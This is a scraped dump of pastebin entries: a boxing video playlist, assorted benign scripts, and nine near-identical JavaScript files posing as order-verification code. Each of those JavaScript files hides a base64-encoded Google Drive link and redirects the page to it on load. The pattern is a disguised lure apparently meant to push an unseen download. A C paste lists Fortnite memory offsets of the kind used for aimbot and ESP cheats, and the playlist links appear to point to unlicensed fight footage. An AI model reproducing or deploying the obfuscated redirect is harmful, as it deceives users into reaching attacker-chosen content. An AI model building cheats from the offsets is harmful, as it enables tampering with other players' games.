	""image"": ""https://i.postimg.cc/rwDWbBJj/IMG-20240127-121133.jpg"",
    ""url"": ""https://filemoon.to/d/g6py37oqop4g"",
	""info"": ""09-06-2012"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Pacquiao 🆚 Bradley 2"",
	""image"": ""https://i.postimg.cc/LsNGQZ6G/IMG-20240127-121142.jpg"",
	""url"": ""https://filemoon.to/d/in6sb7et92vv"",
	""info"": ""12-04-2014"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Pacquiao 🆚 Margarito"",
	""image"": ""https://i.postimg.cc/7YGncQfr/IMG-20240127-121150.jpg"",
	""url"": ""https://filemoon.to/d/mk4yajwvp1lv"",
	""info"": ""13-11-2010"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Alvarez 🆚 Hatton"",
	""image"": ""https://i.postimg.cc/nVSqZ8Ww/IMG-20240127-121158.jpg"",
	""url"": ""https://filemoon.to/d/8en77h8vn9aw"",
	""info"": ""05-03-2011"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
    ""embed"": ""true"",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Cotto 🆚 Martinez"",
	""image"": ""https://i.postimg.cc/DzxW7LZ3/IMG-20240127-121206.jpg"",
	""url"": ""https://filemoon.to/d/n35lr0vhbu5b"",
	""info"": ""07-06-2014"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Barrera 🆚 Pacquiao"",
	""image"": ""https://i.postimg.cc/Kv7Hcr6W/IMG-20240127-121214.jpg"",
	""url"": ""https://filemoon.to/d/b6iac2nocnwa"",
	""info"": ""15-11-2003"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Canelo 🆚 Chavez Jr"",
	""image"": ""https://i.postimg.cc/7PVrL4rD/IMG-20240127-165120.jpg"",
	""url"": ""https://filemoon.to/d/wviw3xhpl11m"",
	""info"": ""06-05-2017"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Tyson 🆚 Holmes"",
	""image"": ""https://i.postimg.cc/wTCCfjhX/IMG-20240127-121837-297.jpg"",
	""url"": ""https://filemoon.to/d/09phevok6xhg"",
	""info"": ""22-01-1988"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Foreman 🆚 Ellis"",
	""image"": ""https://i.postimg.cc/7PnvskKd/IMG-20240127-121849-122.jpg"",
	""url"": ""https://filemoon.to/d/n6lravtnbzi4"",
	""info"": ""12-07-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"", 
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Hamed 🆚 Barrera"",
	""image"": ""https://i.postimg.cc/Fsz3jgPY/IMG-20240127-123851-351.jpg"",
	""url"": ""https://filemoon.to/d/v71jnsjkm6qj"",
	""info"": ""07-04-2001"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Maywheather 🆚 Marquez"",
	""image"": ""https://i.postimg.cc/Sx2Q4Vdb/IMG-20240127-124415-891.jpg"",
	""url"": ""https://filemoon.to/d/hv51ewok6wfm"",
	""info"": ""19-09-2009"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Buchanan 🆚 Duran"",
	""image"": ""https://i.postimg.cc/s2JgHxKM/IMG-20240127-125107-745.jpg"",
	""url"": ""https://filemoon.to/d/gukuro2j0blc"",
	""info"": ""26-06-1972"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Ali 🆚 Chuvalo"",
	""image"": ""https://i.postimg.cc/Xq8YfYYW/IMG-20240128-115740.jpg"",
	""url"": ""https://filemoon.to/d/5g6qo5hwapkx"",
	""info"": ""29-06-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Chavez 🆚 Smith"",
	""image"": ""https://i.postimg.cc/fyRrCY4B/IMG-20240128-120104-508.jpg"",
	""url"": ""https://filemoon.to/d/j24cl04tcjye"",
	""info"": ""19-09-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
  	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""De La Hoya 🆚 Quartey"",
	""image"": ""https://i.postimg.cc/9MjLLMNR/IMG-20240128-121706-495.jpg"",
	""url"": ""https://filemoon.to/d/mi9nhrab466h"",
	""info"": ""13-02-1999"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Marciano 🆚 Moore"",
	""image"": ""https://i.postimg.cc/SNyWQPPM/IMG-20240128-123246-989.jpg"",
	""url"": ""https://filemoon.to/d/zksplgins83r"",
	""info"": ""21-09-1955"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Torres 🆚 Cotton"",
	""image"": ""https://i.postimg.cc/d3znq5wL/IMG-20240128-123455-840.jpg"",
	""url"": ""https://filemoon.to/d/n2u5ttifcret"",
	""info"": ""15-08-1966"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Tyson 🆚 Ruddock"",
	""image"": ""https://i.postimg.cc/DfRFHJBT/Tyson-vs-ruddock.jpg"",
	""url"": ""https://filemoon.in/d/zuueuxiqs0pg"",
	""info"": ""18-03-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Barkley 🆚 Duran"",
	""image"": ""https://i.postimg.cc/fb5Dn23s/IMG-20240202-081550-655.jpg"",
	""url"": ""https://filemoon.to/d/r7u7k3791v6s"",
	""info"": ""02-12-2000"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Trinidad 🆚 Vargas"",
	""image"": ""https://i.postimg.cc/nrt5vcWD/IMG-20240202-081628-116.jpg"",
	""url"": ""https://filemoon.to/d/if6vrk15nx3u"",
	""info"": ""24-02-1989"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Leonard 🆚 Camacho"",
	""image"": ""https://i.postimg.cc/RCYDJK0V/IMG-20240202-081643-035.jpg"",
	""url"": ""https://filemoon.to/d/gw3n1lza8cl8"",
	""info"": ""01-03-1997"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Holyfield 🆚 Holmes"",
	""image"": ""https://i.postimg.cc/NFFZ7k9g/IMG-20240202-081656-212.jpg"",
	""url"": ""https://filemoon.to/d/fglvnvtje276"",
	""info"": ""19-06-1992"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Holyfield 🆚 Foreman"",
	""image"": ""https://i.postimg.cc/qvRbDmyS/Holyfield-Foreman-19-04-91.jpg"",
	""url"": ""https://filemoon.to/d/yl6700qvjome"",
	""info"": ""19-04-1991"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Mosley 🆚 Mayorga"",
	""image"": ""https://i.postimg.cc/1XsMGMyW/Mosley-Mayorga-27-09-08.jpg"",
	""url"": ""https://filemoon.to/d/svu3u8tt8fr6"",
	""info"": ""27-09-2008"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Foreman 🆚 Briggs"",
	""image"": ""https://i.postimg.cc/NF0XmwZC/IMG-20240221-201216-934.jpg"",
	""url"": ""https://filemoon.to/d/09elvbu7ru02"",
	""info"": ""22-11-1997"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Whitaker 🆚 Chavez"",
	""image"": ""https://i.postimg.cc/m213DF4h/IMG-20240221-201236-722.jpg"",
	""url"": ""https://filemoon.to/d/6t51d8gkgtcj"",
	""info"": ""10-09-1993"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Morales 🆚 Pacquiao"",
	""image"": ""https://i.postimg.cc/Fzp49Cwf/IMG-20240221-201256-852.jpg"",
	""url"": ""https://filemoon.to/d/5iup2twnbd1f"",
	""info"": ""19-03-2005"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Louis 🆚 Charles"",
	""image"": ""https://i.postimg.cc/bwTGBwxG/IMG-20240311-203743-326.jpg"",
	""url"": ""https://filemoon.to/d/heji2bom3gtp"",
	""info"": ""29-09-1950"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Ali 🆚 Patterson"",
	""image"": ""https://i.postimg.cc/jSs3dbvR/IMG-20240311-203751-668.jpg"",
	""url"": ""https://filemoon.to/d/51tjgzrl4pz4"",
	""info"": ""20-09-1972"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Chavez 🆚 Taylor"",
	""image"": ""https://i.postimg.cc/7hZWbS03/IMG-20240330-201718.jpg"",
	""url"": ""https://filemoon.to/d/6esrdx0p7tn8/"",
""referer"":""https://embedme.xyz"",
	""info"": ""17-03-1990"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Hagler 🆚 Leonard"",
	""image"": ""https://i.postimg.cc/QM5RYqCy/hagler-1.jpg"",
	""url"": ""https://filemoon.to/d/gk1hwe6o5x25"",
""referer"":""https://embedme.xyz"",
	""info"": ""06-04-1987"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Vargas 🆚 Wright"",
	""image"": ""https://i.postimg.cc/yYBsnP6W/images-1.jpg"",
	""url"": ""https://filemoon.to/d/zaief02wvvco"",
""referer"":""https://embedme.xyz"",
	""info"": ""04-12-1999"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Leonard 🆚 Mayweather Sr"",
	""image"": ""https://i.postimg.cc/DZ95Cwnw/IMG-20240725-200333-1.jpg"",
	""url"": ""https://filemoon.to/d/7rx5eohor9ue"",
""referer"":""https://embedme.xyz"",
	""info"": ""09-09-1978"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
    { 
	""name"": ""Marquez 🆚 Peden"",
	""image"": ""https://i.postimg.cc/nz8xYq4z/x1080-1.jpg"",
	""url"": ""https://filemoon.to/d/6r7qachp3fzk"",
""referer"":""https://embedme.xyz"",
	""info"": ""09-03-2002"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	},
{ 
	""name"": ""Hagler 🆚 Mugabi"",
	""image"": ""https://i.postimg.cc/wvsGPjM7/sddefault-1.jpg"",
	""url"": ""https://nikaplayerr.com/file/aqpxa9ictmef"",
""referer"":"""",
	""info"": ""10-03-1986"",
	""userAgent"": ""PlusMediaPlayer/0.0.9"",
    ""embed"": """",
	""isHost"": ""true"",
	""online"": ""true""
	}
 
 
]
}"
78nPJ6cP,Untitled,Oppaceted,Python,Friday 28th of March 2025 06:20:08 PM CDT,"from plots_drawing import *
from body_creation import *
import numpy as np
from constants import x_lim, y_lim

while True:
    body_generation_type = input(""Введите вариант отрисовки тела - 'full' для полной отрисовки или 'edges' чтобы нарисовать только границы: "")
    if body_generation_type in [""full"", ""edges""]:
        break
    else:
        print(""Слово написано некорректно, попробуйте ещё раз\n"")

while True:
    n = input(""\nВведите количество точек или ничего для значения по умолчанию (100 точек): "")
    try:
        n = 100 if n == """" else int(n)
        initial_points = generate_body_points_full(n=n) if body_generation_type == ""full"" else generate_body_points_only_edge(n=n)
        # Расчет траекторий
        plot_trajectories(initial_points)
    except:
        print(""Некорректный ввод, пожалуйста, повторите"")
        continue
    break

# Визуализация линий тока
t = []
t_default = [1.0, 1.4]
while True:
    temp = input(f""\nВведите моменты времени, в которые нужно отрисовать графики. Значение по умолчанию: [1.0, 1.4] Текущие значение:{t}\nВведите ваше значение, или ничего, если хотите продолжить:"")
    if temp:
        try:
            temp = float(temp)
            if temp > 0:
                t.append(temp)
            else:
                raise ValueError
        except:
            print(""Некорректный ввод, пожалуйста, повторите"")
    else:
        break
t = t_default if not t else t

print()

while True:
    quarter = input(""Введите четверть в которой хотите посчитать (в условии первая): "")
    if quarter not in [""1"", ""2"", ""3"", ""4""]:
        print(""Пожалуйста, введите четверть  как число"")
    else:
        quarter = int(quarter)
        break

x_lim_enter = np.array(tuple(reversed(x_lim)))*-1 if quarter in [2, 3] else np.array(x_lim)
y_lim_enter = np.array(tuple(reversed(y_lim)))*-1 if quarter in [3, 4] else np.array(y_lim)

for i in t:
    plot_streamlines(i, x_lim=x_lim_enter, y_lim=y_lim_enter)"
5gCjrF2f,Untitled,angelgoitia,PHP,Friday 28th of March 2025 06:12:18 PM CDT,"$response = $this->client->get($googleApiUrl, [
                'query' => [
                    'q' => ""{$hashtag} site:instagram.com"",
                    'num' => 10, 
                    'key' => env('GOOGLE_API'),
                    'cx' => env('GOOGLE_CX'),
                ],
                'headers' => [
                    'Accept' => 'application/json',
                ],
            ]);

            $results = json_decode($response->getBody()->getContents(), true);
            dd($results);"
0j6qVxm2,RSS,Tiago_f,mIRC,Friday 28th of March 2025 06:09:17 PM CDT,"on *:dialog:rss.add:*:*:{
  if ($devent == init) {
    if (%rss.edit) {
      tokenize 32 %rss.edit
      did -a $dname 4 $1
      did -a $dname 3 $2-
      dialog -t $dname Edit RSS feed $chr(35) $+ $calc($did(feedr,3).sel -1)
    }
  }
  elseif ($devent == sclick) {
    if ($did == 6) {
      if ($did(3)) && ($did(4)) {
        var %u = $replace($did(4),$chr(32),% $+ 20)
        if (%rss.edit) {
          if ($hget(rss,%u) != $null) && ($did(3) != $gettok($v1,2-,32)) { errdialog The URL you edited %u already exists with the name $gettok($hget(rss,%u),2-,32) $+ ! | halt }
          else {
            var %n = $encode($did(3),m),%v = $cell(feedr,3,1)),%e = %v $+ *
            while ($hfind(rssdone,%e,1,w)) {
              var %i = $v1
              hadd rssdone $+(%n,,$wd(%i,2,1)) 1
              hdel rssdone %i
            }
            hadd rssdone SHA1: $+ %n $hget(rssdone,SHA1: $+ %v)
            hdel rssdone SHA1: $+ %v
            hadd rss %u $calc($wd($did(feedr,3).seltext,5,32) -1) $did(3)
            hdel rss %rss.edit
            did -co feedr 3 $did(feedr,3).sel 1 +fs 0 0 $wd($did(feedr,3).seltext,5,32) $did(3) $+ 	+ 0 0 0 %u
          }
        }
        elseif ($hget(rss,%u) != $null) { errdialog The URL %u already exists! | halt }
        else {
          hadd rss %u 0 $did(3)
          mdxunsel feedr 3
          did -ac feedr 3 1 + 0 0 1 $did(3) $+ 	+ 0 0 0 %u
        }
        did $iif($did(feedr,3).sel,-e,-b) feedr 6,8,24,26
        did $iif($did(feedr,3).lines >= 1,-e,-b) feedr 7
      }
      else { beep.error | halt }
    }
  }
  elseif ($devent == close) { rss.setsave }
}"
YFP331Ud,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:59:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/544/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iWuGQAE3,Untitled,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:43:51 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/208/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YuEG8LAt,Products.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:28:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/583/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mQxpeB15,Untitled,RayTheLocker123123,C,Friday 28th of March 2025 05:27:38 PM CDT,"#define GWORLD 0x1771c988
#define FNAME 0x1792E740                     //0x130C2A80
#define GAME_INSTANCE 0x208 //0x210 
#define LOCAL_PLAYERS 0x38
#define PLAYER_CONTROLLER 0x30 
#define LOCAL_PAWN 0x350
#define CURRENT_WEAPON 0xa80 
#define VELOCITY 0x180 //CompentVELOCITY
#define GRAVITY 0x8a2 // bUseGravity
#define PAWN_PRIVATE 0x320
#define location_under_reticle  0x27f0 // https://dumpspace.spuckwaffel.com/Games/?hash=6b77eceb&type=classes&idx=AFortPlayerController&member=LocationUnderReticle
#define ROOT_COMPONENT 0x1B0
#define RELATIVE_LOCATION 0x138
#define PLAYER_STATE 0x2c8
#define PLAYER_CAMARA_MANEGER 0x360
#define GAME_STATE 0x190 /// 0x188 //0x190
#define PLAYER_ARRAY 0x2C0
#define MESH 0x328
#define Playername 0xb08
#define TEAM_INDEX 0x1259
#define WEAPON_DATA 0x570
#define CURRENT_WEAPON 0xa80
#define AMMO_COUNT 0xefc
#define COMPONENT_TO_WORLD 0x1E0
#define CURRENT_VEHICLE 0x2b40
#define BONE_ARRAY 0x5c8
#define BONE_ARRAY_ACCHE 0x5b8
#define LAST_SUMBIT_TIME 0x2E8
#define LAST_SUMBIT_TIME_ON_SCREEN 0x2F0
#define ProjectileSpeed 0x1d48  //ProjectileSpeed  
#define ProjectileGravityScale 0x1dfc // ProjectileGravityScale
#define PLATFORM 0x430
#define HABANERO_COMPONENT 0xa48
#define RANKED_PROGRESS 0xd0
#define PLAYER_ID 0x2ac
#define b_is_dying 0x718
#define ITEM_NAME 0x40
#define TargetedFortPawn 0x1990

#define KILL_COUNT 0x126c // https://dumpspace.spuckwaffel.com/Games/?hash=6b77eceb&type=classes&idx=AFortPlayerStateAthena&member=KillScore
#define FortPTR uintptr_t"
nSA9W5yc,Order.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 05:12:37 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/547/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
UhBbr3TK,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 04:57:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/074/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ThcUK6vb,count_burgers,drpanwe,Go,Friday 28th of March 2025 04:37:37 PM CDT,"package main

import (
	""fmt""
	""image""
	""image/color""
	imgdraw ""image/draw""

	""github.com/clktmr/n64/drivers/display""
	n64draw ""github.com/clktmr/n64/drivers/draw""
	""github.com/clktmr/n64/fonts/gomono12""
	_ ""github.com/clktmr/n64/machine""
	""github.com/clktmr/n64/rcp/video""
)

var burgers int64 = 0

func main() {
	// Initialize the N64 system
	video.SetupPAL(false, false)

	// Create a framebuffer
	video.SetupPAL(false, false)
	resolution := video.NativeResolution().Div(2)
	disp := display.NewDisplay(resolution, video.BPP16)

	// Create a rendering rdp
	rdp := n64draw.NewRdp()

	// Create a font face with the gomono12 font
	font := gomono12.NewFace(gomono12.X0000_00ff())

	// Main game loop
	for {
		// Clear the screen
		rdp.SetFramebuffer(disp.Swap())
		rdp.Draw(rdp.Bounds(), &image.Uniform{color.Black}, image.Point{}, imgdraw.Src)

		// Increment burger counter
		burgers++

		// Draw text at position (10, 10) in white
		text := fmt.Sprintf(""Burgers: %d"", burgers)
		rdp.DrawText(rdp.Bounds(), font, image.Point{10, 10}, color.White, nil, []byte(text))

		// Flush the RDP
		rdp.Flush()
	}
}
"
inqkxag6,Products.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 04:26:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/616/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
T4WakudG,Order.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 04:10:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/370/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZLQ0ZMwp,Market.js,rodrigomaise99,JavaScript,Friday 28th of March 2025 03:55:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/908/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
